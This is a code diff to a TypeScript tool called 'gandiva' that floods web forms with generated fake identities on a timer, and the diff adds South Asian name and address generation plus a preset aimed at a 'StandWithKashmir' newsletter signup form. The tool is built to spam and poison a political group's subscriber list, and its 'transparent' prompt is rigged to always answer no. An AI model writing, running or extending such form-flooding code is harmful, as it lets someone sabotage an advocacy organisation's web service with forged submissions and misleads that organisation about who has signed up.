@@ -3,6 +3,8 @@ import chalk from 'chalk'
 import strictURIEncode from 'strict-uri-encode'
 import { setIntervalAsync, clearIntervalAsync } from 'set-interval-async/fixed'
 import faker from 'faker'
+import randomIndianName from 'random-indian-name'
+import generateIndianSubcontinentAddress from './functions/generateIndianSubcontinentAddress'
 import usernameGenerator from './functions/usernameGenerator'
 import { getHeader, clearLastLines } from './functions'
 import fs from 'fs'
@@ -13,7 +15,7 @@ import inquirer from 'inquirer'
 
 
 // Typescript:
-import { IMainProps } from './types'
+import { IMainProps, TIndianSubcontinentCountry } from './types'
 
 
 // Constants:
@@ -25,7 +27,8 @@ const main = async ({
   preset,
   attackDuration,
   spamCount,
-  hidden
+  hidden,
+  indian
 }: IMainProps) => {
   console.log(chalk.yellow.bold('🏹 gandiva - ') + 'initialising..')
   const timeID = Date.now()
@@ -36,10 +39,15 @@ const main = async ({
   let currentSpamCount = 0
   const timer = setIntervalAsync(async () => {
     try {
-      const rootName = faker.name.findName()
+      const rootName = indian ? randomIndianName() as string : faker.name.findName()
       const fakeCredentials = {
+        firstName: rootName.split(' ')[0],
+        lastName: rootName.split(' ').splice(1).join(' '),
         name: strictURIEncode([ rootName, rootName.toLowerCase() ][ Math.floor(Math.random() * 2) ]).replace(/%20/g, '+'),
-        address: strictURIEncode(
+        address: indian ?
+        await generateIndianSubcontinentAddress([ 'INDIAN', 'PAKISTANI', 'BANGLADESHI' ][ Math.floor(Math.random() * 3) ] as TIndianSubcontinentCountry)
+        :
+        strictURIEncode(
           faker.address.streetAddress(true) + ', ' +
           faker.address.city() + ['', ' ' + faker.address.zipCode() ][ Math.round(Math.random()) ] + ', ' +
           faker.address.country()
@@ -57,7 +65,7 @@ const main = async ({
         cookie: PRESETS[ preset ].params.cookie
       }
       const header = getHeader(params.referrer, params.cookie)
-      identities.push({ fakeCredentials, chosenOption })
+      identities.push({ fakeCredentials, chosenOption, data: params.data })
       fs.writeFileSync(`./identities-${ timeID }.json`, JSON.stringify(identities, null, '\t'), { encoding: 'utf-8' })
       if (!hidden) {
         await axios.post(params.URL, params.data, { headers: header })
@@ -94,7 +102,11 @@ inquirer.prompt([
       // {
       //   name: 'Afghanistan Seminar Form',
       //   value: 2
-      // }
+      // },
+      {
+        name: 'StandWithKashmir E-Newsletter Subscription',
+        value: 3
+      }
     ],
     message: 'which preset would you like to choose?',
     default: 1
@@ -117,5 +129,11 @@ inquirer.prompt([
     message: 'do you want to be transparent?',
     default: true,
     filter: () => false
+  },
+  {
+    name: 'indian',
+    type: 'confirm',
+    message: 'do you want to use indian names and addresses?',
+    default: false,
   }
 ]).then(answers => main(answers))
